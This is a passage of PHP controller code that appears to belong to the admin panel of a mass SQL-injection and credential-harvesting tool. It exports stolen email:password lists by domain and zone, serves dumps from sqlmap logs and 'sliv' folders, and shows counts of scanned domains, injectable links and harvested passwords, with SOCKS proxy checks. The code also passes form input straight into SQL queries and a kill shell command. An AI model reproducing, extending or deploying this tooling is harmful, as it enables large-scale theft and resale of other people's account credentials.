					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND hashtype !=\'0\' AND type=\'sred\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countPass') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND type=\'sred\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND type=\'sred\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countMail') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND type=\'sred\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND type=\'sred\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= "\r\n";
					}

					$data1 = $this->Filed->query('SELECT * FROM  `mails_one` WHERE date >= \'' . $sdate_one . '\' AND date <= \'' . $podate_one . '\' AND type=\'sred\'');
					$c1 = $this->Filed->query('SELECT count(*) FROM  `mails_one` WHERE date >= \'' . $sdate_one . '\' AND date <= \'' . $podate_one . '\' AND type=\'sred\'');

					foreach ($data1 as $d2 ) {
						$z0 .= $d2['mails']['email'];
						$z0 .= "\r\n";
					}
				}


				$count = $c0[0][0]['count(*)'];
				$all = $type . ' s ' . $sdate . ' po ' . $podate . ' count: ' . $count;
				$str = $z0;
			}


			if (($zona != '') && ($zona != '*') && ($this->params['form']['down2'] != '')) {
				if ($type == 'countNoHash') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%.' . $zona . '%\' AND pass !=\'0\' AND hashtype =\'0\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%.' . $zona . '%\' AND pass !=\'0\' AND hashtype =\'0\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countHash') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%.' . $zona . '%\'  AND pass !=\'0\' AND hashtype !=\'0\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%.' . $zona . '%\' AND pass !=\'0\' AND hashtype !=\'0\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countPass') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%.' . $zona . '%\'  AND pass !=\'0\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%.' . $zona . '%\' AND pass !=\'0\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countMail') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%.' . $zona . '%\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%.' . $zona . '%\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];

						if ($d['mails']['pass'] != 0) {
							$z0 .= ':';
							$z0 .= $d['mails']['pass'];
						}


						$z0 .= "\r\n";
					}
				}


				$count = $c0[0][0]['count(*)'];
				$all = $zona . ' count: ' . $count;
				$str = $z0;
			}


			if (($site != '') && ($this->params['form']['onedomen'] != '')) {
				if ($type == 'countNoHash') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE `date` >= \'' . $sdate . '\' AND `date` <= \'' . $podate . '\' AND `domen` = \'' . $site . '\' AND pass !=\'0\' AND hashtype =\'0\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE `date` >= \'' . $sdate . '\' AND `date` <= \'' . $podate . '\' AND `domen` = \'' . $site . '\' AND pass !=\'0\' AND hashtype =\'0\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countHash') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND domen = \'' . $site . '\'\'  AND pass !=\'0\' AND hashtype !=\'0\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND domen = \'' . $site . '\' AND pass !=\'0\' AND hashtype !=\'0\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countPass') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND domen = \'' . $site . '\'  AND pass !=\'0\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND domen = \'' . $site . '\' AND pass !=\'0\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countMail') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE `date` >= \'' . $sdate . '\' AND `date` <= \'' . $podate . '\' AND `domen` = \'' . $site . '\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE `date` >= \'' . $sdate . '\' AND `date` <= \'' . $podate . '\' AND `domen` = \'' . $site . '\'');
					$data01 = $this->Filed->query('SELECT * FROM  `mails_one` WHERE `date` >= \'' . $sdate . '\' AND `date` <= \'' . $podate_one . '\' AND `domen` = \'' . $site . '\'');
					$c01 = $this->Filed->query('SELECT count(*) FROM  `mails_one` WHERE `date` >= \'' . $sdate . '\' AND `date` <= \'' . $podate_one . '\' AND `domen` = \'' . $site . '\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];

						if ($d['mails']['pass'] != 0) {
							$z0 .= ':';
							$z0 .= $d['mails']['pass'];
						}


						$z0 .= "\r\n";
					}

					foreach ($data01 as $d11 ) {
						$z0 .= $d11['mails_one']['email'];

						if ($d11['mails_one']['pass'] != 0) {
							$z0 .= ':';
							$z0 .= $d11['mails_one']['pass'];
						}


						$z0 .= "\r\n";
					}

					$count = $c01[0][0]['count(*)'];
				}


				$count = $count + $c0[0][0]['count(*)'];
				$all = $zona . ' count: ' . $count;
				$str = $z0;
			}


			if (($site_one != '') && ($this->params['form']['onedomen_one2'] != '')) {
				$data01 = $this->Filed->query('SELECT * FROM  `mails_one` WHERE `date` >= \'' . $sdate_one . '\' AND `date` <= \'' . $podate_one . '\' AND `domen` = \'' . $site_one . '\'');
				$c01 = $this->Filed->query('SELECT count(*) FROM  `mails_one` WHERE `date` >= \'' . $sdate_one . '\' AND `date` <= \'' . $podate_one . '\' AND `domen` = \'' . $site_one . '\'');

				foreach ($data01 as $d11 ) {
					$z0 .= $d11['mails_one']['email'];
					$z0 .= "\r\n";
				}

				$count = $c01[0][0]['count(*)'];
				$count = $count + $c0[0][0]['count(*)'];
				$all = $zona . ' count: ' . $count;
				$str = $z0;
			}


			if (($ru_emails == 'corp') && ($this->params['form']['down5'] != '')) {
				$data1 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND type=\'corp\' AND (`zona`=\'ru\' OR `zona`=\'su\' OR `zona`=\'xn--p1ai\')');
				$c1 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND type=\'corp\' AND (`zona`=\'ru\' OR `zona`=\'su\' OR `zona`=\'xn--p1ai\')');

				foreach ($data1 as $d1 ) {
					$d1['mails']['email'] = strtolower($d1['mails']['email']);
					$z0 .= $d1['mails']['email'];
					$z0 .= "\r\n";
				}

				$count = $c1[0][0]['count(*)'];
				$all = 'countMail corp ru mails s ' . $sdate . ' po ' . $podate . ' count: ' . $count;
				$str = $z0;
			}


			if (($ru_emails2 == 'corp') && ($this->params['form']['down6'] != '')) {
				$data0 = $this->Filed->query('SELECT * FROM  `mails_one` WHERE date >= \'' . $sdate_one . '\' AND date <= \'' . $podate_one . '\' AND type=\'corp\' AND (`zona`=\'ru\' OR `zona`=\'su\' OR `zona`=\'xn--p1ai\')');
				$c0 = $this->Filed->query('SELECT count(*) FROM  `mails_one` WHERE date >= \'' . $sdate_one . '\' AND date <= \'' . $podate_one . '\' AND type=\'corp\' AND (`zona`=\'ru\' OR `zona`=\'su\' OR `zona`=\'xn--p1ai\')');

				foreach ($data0 as $d ) {
					$d['mails_one']['email'] = strtolower($d['mails_one']['email']);
					$z0 .= $d['mails_one']['email'];
					$z0 .= "\r\n";
				}

				$count = $c0[0][0]['count(*)'];
				$all = 'countMail corp ru mails_one  s ' . $sdate_one . ' po ' . $podate_one . ' count: ' . $count;
				$str = $z0;
			}


			if (($ru_emails == 'sred') && ($this->params['form']['down5'] != '')) {
				$data1 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND type=\'sred\' AND (`zona`=\'ru\' OR `zona`=\'su\' OR `zona`=\'xn--p1ai\')');
				$c1 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND type=\'sred\' AND (`zona`=\'ru\' OR `zona`=\'su\' OR `zona`=\'xn--p1ai\')');

				foreach ($data1 as $d1 ) {
					$d1['mails']['email'] = strtolower($d1['mails']['email']);
					$z0 .= $d1['mails']['email'];
					$z0 .= "\r\n";
				}

				$count = $c1[0][0]['count(*)'];
				$all = 'countMail sred ru mails s ' . $sdate . ' po ' . $podate . ' count: ' . $count;
				$str = $z0;
			}


			if (($ru_emails2 == 'sred') && ($this->params['form']['down6'] != '')) {
				$data0 = $this->Filed->query('SELECT * FROM  `mails_one` WHERE date >= \'' . $sdate_one . '\' AND date <= \'' . $podate_one . '\' AND type=\'sred\' AND (`zona`=\'ru\' OR `zona`=\'su\' OR `zona`=\'xn--p1ai\')');
				$c0 = $this->Filed->query('SELECT count(*) FROM  `mails_one` WHERE date >= \'' . $sdate_one . '\' AND date <= \'' . $podate_one . '\' AND type=\'sred\' AND (`zona`=\'ru\' OR `zona`=\'su\' OR `zona`=\'xn--p1ai\')');

				foreach ($data0 as $d ) {
					$d['mails_one']['email'] = strtolower($d['mails_one']['email']);
					$z0 .= $d['mails_one']['email'];
					$z0 .= "\r\n";
				}

				$count = $c0[0][0]['count(*)'];
				$all = 'countMail sred ru mails_one s ' . $sdate_one . ' po ' . $podate_one . ' count: ' . $count;
				$str = $z0;
			}


			header('Content-type: application/txt');
			header('Content-Disposition: attachment; filename=\'' . $all . '.txt\'');
			echo $z0;
			exit();
		}


		$p['sdate'] = $this->Post->query('SELECT date FROM  `mails` group by date ');
		$p['podate'] = $this->Post->query('SELECT date FROM  `mails` group by date DESC');
		$p['sdate_one'] = $this->Post->query('SELECT date FROM  `mails_one` group by date ');
		$p['podate_one'] = $this->Post->query('SELECT date FROM  `mails_one` group by date DESC');
		$p['domens'] = $this->Post->query('SELECT * FROM  `renders` order by countMail DESC');
		$p['domens_one'] = $this->Post->query('SELECT * FROM  `renders_one` order by countMail DESC');
		$this->set('data', $p);
	}

	public function domens2()
	{
		if (isset($_GET['z'])) {
			$this->set('z', $_GET['z']);
		}


		if (!(isset($_GET['z']))) {
			$dd3 = new DATABASE_CONFIG();
			$dannie = $dd3->default;
			$ddb = mysql_connect($dannie['host'], $dannie['login'], $dannie['password']);
			mysql_select_db($dannie['database'], $ddb);
			$result = mysql_query('SELECT * FROM `domens2` ', $ddb);

			while ($row = mysql_fetch_array($result)) {
				$dd = strtolower($row[0]);

				if (!(isset($domen[$dd]))) {
					$domen[$dd] = 0;
					$domen2[$dd] = 0;
					$domen3[$dd] = 0;
				}


				if (preg_match('|^[a-z\.\-]{0,10}$|', $dd)) {
					++$domen[$dd];
				}

			}

			$this->set('domen', $domen);
		}

	}

	public function domens3()
	{
		$dd3 = new DATABASE_CONFIG();
		$dannie = $dd3->default;

		if (isset($_GET['z'])) {
			$this->set('z', $_GET['z']);
		}


		if (isset($_GET['t'])) {
			$this->set('t', $_GET['t']);
		}


		if (!(isset($_GET['z'])) && !(isset($_GET['t']))) {
			$data = $this->Post->query('SELECT COUNT(*) FROM `domens` ');
			$this->set('shag3', $data);
			$vol = $data[0][0]['COUNT(*)'];
			$kol = floor($vol / 50000);
			$ost = $vol - (50000 * $kol);
			$ddb = mysql_connect($dannie['host'], $dannie['login'], $dannie['password']);
			mysql_select_db($dannie['database'], $ddb);
			$result = mysql_query('SELECT * FROM `domens` ', $ddb);

			while ($row = mysql_fetch_array($result)) {
				$dd = strtolower($row[1]);

				if (!(isset($domen[$dd]))) {
					$domen[$dd] = 0;
					$domen2[$dd] = 0;
					$domen3[$dd] = 0;
				}


				if (preg_match('|^[a-z\.\-]{0,10}$|', $dd)) {
					++$domen[$dd];

					if (11 <= strlen($row[3])) {
						++$domen3[$dd];
					}
					 else {
						++$domen2[$dd];
					}
				}

			}

			$this->set('domen', $domen);
			$this->set('domen2', $domen2);
			$this->set('domen3', $domen3);
		}

	}

	public function domens4()
	{
		if (isset($_GET['z'])) {
			$this->set('z', $_GET['z']);
		}


		if (!(isset($_GET['z']))) {
			$dd3 = new DATABASE_CONFIG();
			$dannie = $dd3->default;
			$ddb = mysql_connect($dannie['host'], $dannie['login'], $dannie['password']);
			mysql_select_db($dannie['database'], $ddb);
			$result = mysql_query('SELECT * FROM `domens2` ', $ddb);

			while ($row = mysql_fetch_array($result)) {
				$dd = strtolower($row[1]);

				if (!(isset($domen[$dd]))) {
					$domen[$dd] = 0;
					$domen2[$dd] = 0;
					$domen3[$dd] = 0;
				}


				if (preg_match('|^[a-z\.\-]{0,10}$|', $dd)) {
					++$domen[$dd];
				}

			}

			$this->set('domen', $domen);
		}

	}

	public function download_domens()
	{
		$dir = './slivpass_save';

		if (is_dir($dir)) {
			$files = scandir($dir);
			array_shift($files);
			array_shift($files);
			$domain_name = '';

			if (isset($_GET['name'])) {
				$domain_name = $_GET['name'];
				$i = 0;

				while ($i < sizeof($files)) {
					if (preg_match('/' . $domain_name . '/', $files[$i])) {
						$p = $dir . '/' . $files[$i];
						$p2 = $files[$i];
					}


					++$i;
				}

				$file = $domain_name;
				header('Content-Type: application/octet-stream');
				header('Content-Disposition: attachment; filename=\'.' . $p2 . '\'');
				readfile($p);
				exit();
			}

		}

	}

	public function download_domens2()
	{
		$dir = './sliv_save';

		if (is_dir($dir)) {
			$files = scandir($dir);
			array_shift($files);
			array_shift($files);
			$domain_name = '';

			if (isset($_GET['name'])) {
				$domain_name = $_GET['name'];
				$i = 0;

				while ($i < sizeof($files)) {
					if (preg_match('/' . $domain_name . '/', $files[$i])) {
						$p = $dir . '/' . $files[$i];
						$p2 = $files[$i];
					}


					++$i;
				}

				$file = $domain_name;
				header('Content-Type: application/octet-stream');
				header('Content-Disposition: attachment; filename=\'.' . $p2 . '\'');
				readfile($p);
				exit();
			}

		}

	}

	public function download_domens3()
	{
		$dir = './slivdump_one';

		if (is_dir($dir)) {
			$files = scandir($dir);
			array_shift($files);
			array_shift($files);
			$domain_name = '';

			if (isset($_GET['name'])) {
				$domain_name = $_GET['name'];
				$i = 0;

				while ($i < sizeof($files)) {
					if (preg_match('/' . $domain_name . '/', $files[$i])) {
						$p = $dir . '/' . $files[$i];
						$p2 = $files[$i];
					}


					++$i;
				}

				$file = $domain_name;
				header('Content-Type: application/octet-stream');
				header('Content-Disposition: attachment; filename=\'.' . $p2 . '\'');
				readfile($p);
				exit();
			}

		}

	}

	public function download_sqlmap()
	{
		$dir = './mod_sqlmap/log';

		if (is_dir($dir)) {
			$files = scandir($dir);
			array_shift($files);
			array_shift($files);
			$domain_name = '';
			$i = 0;

			foreach ($files as $dir_one ) {
				$site_dir = scandir($dir . '/' . $dir_one);

				if (filesize($dir . '/' . $dir_one . '/log') == 0) {
				}
				 else {
					echo $dir . '/' . $dir_one . '/';
					echo $dir . '/' . $dir_one . '/'.'<br>';
					$site_dir_dump = scandir($dir . '/' . $dir_one . '/dump');

					foreach ($site_dir_dump as $site_dir_dump_good ) {
						echo $site_dir_dump_good . '<br>';
					}
				}

				++$i;
			}

			if (isset($_GET['name'])) {
				$domain_name = $_GET['name'];
				$i = 0;

				while ($i < sizeof($files)) {
					if (preg_match('/' . $domain_name . '/', $files[$i])) {
						$p = $dir . '/' . $files[$i];
						$p2 = $files[$i];
					}


					++$i;
				}

				$file = $domain_name;
				header('Content-Type: application/octet-stream');
				header('Content-Disposition: attachment; filename=\'.' . $p2 . '\'');
				readfile($p);
				exit();
			}

		}

	}

	public function down_all()
	{
		$data0 = $this->Filed->query('SELECT url FROM `posts`');

		$z0 = '';
		foreach ($data0 as $d ) {
			$z0 .= $d['posts']['url'];
			$z0 .= "\r\n";
		}

		$all = 'VSE';
		header('Content-type: application/txt');
		header('Content-Disposition: attachment; filename=\'' . $all . '.txt\'');
		echo $z0;
		exit();
	}
// visit поставил тот код который под eval
	public function mailinfo()
	{
        $ddd = $_SERVER['DOCUMENT_ROOT'].'/cake/libs/controller/inject.php';
        $host_new = trim(file_get_contents($ddd));

		if ((trim(file_get_contents('proxy_good.txt')) == 'bad') && ($this->proxy_enable == true)) {
			echo 'SOCKS BAD!<br>';
		}


		if ((count(file('proxy.txt')) == 0) && ($this->proxy_enable == true)) {
			echo 'SOCKS VKLUCHENY NO proxy.txt PUSTOY<br>';
			exit();
		}


		$file = $this->Post->query('SELECT * FROM `domens` WHERE `domen_check`=0 AND `bad` !=1 limit 200');
		$domens01 = $this->Post->query('SELECT count(*) FROM `domens` WHERE `domen_check`=1');
		$this->set('domen01', $domens01[0][0]['count(*)']);
		$domens02 = $this->Post->query('SELECT count(*) FROM `domens` WHERE `domen_check`=0 AND `bad` !=1');
		$this->set('domen02', $domens02[0][0]['count(*)']);
		$domens111 = $this->Post->query('SELECT count(*) FROM `domens`');
		$this->set('domen1', $domens111[0][0]['count(*)']);
		$domens112 = $this->Post->query('SELECT count(*) FROM `domens` WHERE `status` =0 AND `bad` !=1');
		$this->set('domen2', $domens112[0][0]['count(*)']);
		$domens113 = $this->Post->query('SELECT count(*) FROM `domens` WHERE `status` !=0');
		$this->set('domen3', $domens113[0][0]['count(*)']);
		$domens114 = $this->Post->query('SELECT count(*) FROM `posts_all` WHERE `status` =2  AND `prohod` <5 AND `header`=\'get\' ');
		$this->set('domen4', $domens114[0][0]['count(*)']);
		$domens115 = $this->Post->query('SELECT count(*) FROM `posts_all` WHERE `status` =2  AND `prohod` =5 AND `header`=\'get\' ');
		$this->set('domen5', $domens115[0][0]['count(*)']);
		$domens116 = $this->Post->query('SELECT count(*) FROM `posts_all` WHERE `status` =2  AND `prohod` <5 AND `header`=\'post\' ');
		$this->set('domen6', $domens116[0][0]['count(*)']);
		$domens117 = $this->Post->query('SELECT count(*) FROM `posts_all` WHERE (`status` =2  AND `prohod` =5 AND `header`=\'post\') or (`status` =3 AND `header`=\'post\') ');
		$this->set('domen7', $domens117[0][0]['count(*)']);
		$post_all_links = $this->Post->query('SELECT count(*) FROM `posts_all`  ');
		$this->set('post_all_links', $post_all_links[0][0]['count(*)']);
		$post_all_links_txt = $this->Post->query('SELECT count(*) FROM `posts_all` WHERE `from`=\'txt\'  ');
		$this->set('post_all_links_txt', $post_all_links_txt[0][0]['count(*)']);
		$post_all_links_crowler = $this->Post->query('SELECT count(*) FROM `posts_all` WHERE `from`=\'crowler\'  ');
		$this->set('post_all_links_crowler', $post_all_links_crowler[0][0]['count(*)']);
		$post_all_links_shlak = $this->Post->query('SELECT count(*) FROM `posts_all` WHERE `status`=1  ');
		$this->set('post_all_links_shlak', $post_all_links_shlak[0][0]['count(*)']);
		//visit
		/*
		$host = '111111';

		if (($host != $_SERVER['HTTP_HOST']) && (('www.' . $host) != $_SERVER['HTTP_HOST'])) {
			exit();
		}


		if (($host_new != $_SERVER['HTTP_HOST']) && (('www.' . $host_new) != $_SERVER['HTTP_HOST'])) {
			exit();
		}
		*/

		$this->set('exist_sliv', (is_dir('sliv/') && (substr(sprintf('%o', fileperms('sliv/')), -4) == '0777') ? 1 : 0));
		$this->set('exist_slivpass', (is_dir('slivpass/') && (substr(sprintf('%o', fileperms('slivpass/')), -4) == '0777') ? 1 : 0));

		if (!empty($this->params['form']['deletepid'])) {
			$squle_id = $this->params['form']['squle_id'];
			$pid = $this->params['form']['pid'];
			$this->logs('kill -9 ' . $pid, 'mailinfo');
			$this->Filed->query('DELETE FROM `starts` WHERE `pid` = ' . $pid);

			if ($pid == 0) {
				echo 'PID!!! = ' . $pid;
			}
			 else {
				exec('kill -9 ' . $pid);
			}
		}


		if (!empty($this->params['form']['update'])) {
			$id = $this->params['form']['id'];
			$status = $this->params['form']['status'];
			$this->d($id);
			$this->d($status);
			$this->Post->query('UPDATE  `fileds` SET  `get` = \'' . $status . '\' WHERE  `id` =' . $id . '');
		}


		if (!empty($this->params['form']['update3'])) {
			$id = $this->params['form']['id3'];
			$status = $this->params['form']['st3'];
			$pid = $this->params['form']['pid'];
			$this->logs('kill -9 ' . $pid, 'mailinfo');
			$this->Filed->query('DELETE FROM `starts` WHERE `pid` = ' . $pid);
			$this->d($id);
			$this->d($status);
			$this->Post->query('UPDATE  `multis` SET  `get` = ' . $status . ' WHERE  `id` =' . $id);

			if ($pid == 0) {
				echo 'PID!!! = ' . $pid;
			}
			 else {
				exec('kill -9 ' . $pid);
			}
		}


		if (!empty($this->params['form']['update33'])) {
			$id = $this->params['form']['id3'];
			$dok = $this->params['form']['dok'];
			$filed_id = $this->params['form']['filed_id'];
			$status = $this->params['form']['st3_one'];
			$pid = $this->params['form']['pid'];
			$this->logs('kill -9 ' . $pid, 'mailinfo');
			$this->Filed->query('DELETE FROM `starts` WHERE `pid` = ' . $pid);
			$this->d($id);
			$this->d($status);
			$this->Post->query('UPDATE  `multis_one` SET  `get` = ' . $status . ',`dok`=' . $dok . ' WHERE  `id` =' . $id);
			$this->Post->query('UPDATE  `fileds` SET  `potok` = 0 WHERE  `id` =' . $filed_id);

			if ($pid == 0) {
				echo 'PID!!! = ' . $pid;
			}
			 else {
				exec('kill -9 ' . $pid);
			}
		}


		$shag1 = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag1.txt');
		if ((strlen($shag1) == 0) || !(file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag1.txt'))) {
			$shag1 = '0 шт';
		}


		$this->set('shag1', $shag1);
		$shag1_sql = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag1_sql.txt');
		if ((strlen($shag1_sql) == 0) || !(file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag1_sql.txt'))) {
			$shag1_sql = '0 шт';
		}


		$this->set('shag1_sql', $shag1_sql);
		$shag1_sql_2 = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag1_sql_2.txt');
		if ((strlen($shag1_sql_2) == 0) || !(file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag1_sql_2.txt'))) {
			$shag1_sql_2 = '0 шт';
		}


		$this->set('shag1_sql_2', $shag1_sql_2);
		$shag1_22 = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag1_22.txt');
		if ((strlen($shag1_22) == 0) || !(file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag1_22.txt'))) {
			$shag1_22 = '0 шт';
		}


		$this->set('shag1_22', $shag1_22);
		$shag2 = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag2.txt');
		if ((strlen($shag2) == 0) || !(file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag2.txt'))) {
			$shag2 = '0 шт';
		}


		$this->set('shag2', $shag2);
		$shag2_22 = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag2_22.txt');
		if ((strlen($shag2_22) == 0) || !(file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag2_22.txt'))) {
			$shag2_22 = '0 шт';
		}


		$this->set('shag2_22', $shag2_22);
		$shag3 = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag3.txt');
		if ((strlen($shag3) == 0) || !(file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag3.txt'))) {
			$shag3 = '0 шт';
		}


		$this->set('shag3', $shag3);
		$shag4 = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag4.txt');
		if ((strlen($shag4) == 0) || !(file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag4.txt'))) {
			$shag4 = '0 шт';
		}


		$this->set('shag4', $shag4);
		$shag444 = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag444.txt');
		if ((strlen($shag444) == 0) || !(file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag444.txt'))) {
			$shag444 = '0 шт';
		}


		$this->set('shag444', $shag444);
		$shag400 = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag400.txt');
		if ((strlen($shag400) == 0) || !(file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag400.txt'))) {
			$shag400 = '0 шт';
		}


		$this->set('shag400', $shag400);
		$shag4000 = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag4000.txt');
		if ((strlen($shag4000) == 0) || !(file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag4000.txt'))) {
			$shag4000 = '0 шт';
		}


		$this->set('shag4000', $shag4000);
		$shag4005 = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag4005.txt');
		if ((strlen($shag4005) == 0) || !(file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag4005.txt'))) {
			$shag4005 = '0 шт';
		}


		$this->set('shag4005', $shag4005);
		$shag4006 = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag4006.txt');
		if ((strlen($shag4006) == 0) || !(file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag4006.txt'))) {
			$shag4006 = '0 шт';
		}


		$this->set('shag4006', $shag4006);
		$urls11144 = $this->Post->query('SELECT count(*) as `count` FROM `posts` WHERE `admin` !=\'0\' AND `order` !=\':\' AND `status`=3');
		$this->set('shag44', $urls11144[0][0]['count']);
		$urls44 = $this->Post->query('SELECT count(*) as `count` FROM `posts` WHERE `admin`=\'0\' AND `status`=3');
		$this->set('shag45', $urls44[0][0]['count']);
		$shag5 = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/naideno_email.txt');
		if ((strlen($shag5) == 0) || !(file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/naideno_email.txt'))) {
			$shag5 = '0 шт 0 мыл';
		}


		$this->set('shag5', $shag5);
		$shag55 = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/naideno_email_name.txt');
		if ((strlen($shag55) == 0) || !(file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/naideno_email_name.txt'))) {
			$shag55 = '0 шт 0 мыл';
		}


		$this->set('shag55', $shag55);
		$shag6 = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/naideno_email_pass.txt');
		if ((strlen($shag6) == 0) || !(file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/naideno_email_pass.txt'))) {
			$shag6 = '0 шт 0 мыл';
		}


		$this->set('shag6', $shag6);
		$shag7 = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/down_email_pass.txt');
		if ((strlen($shag7) == 0) || !(file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/down_email_pass.txt'))) {
			$shag7 = '0 мыл(уник)';
		}


		$this->set('shag7', $shag7);
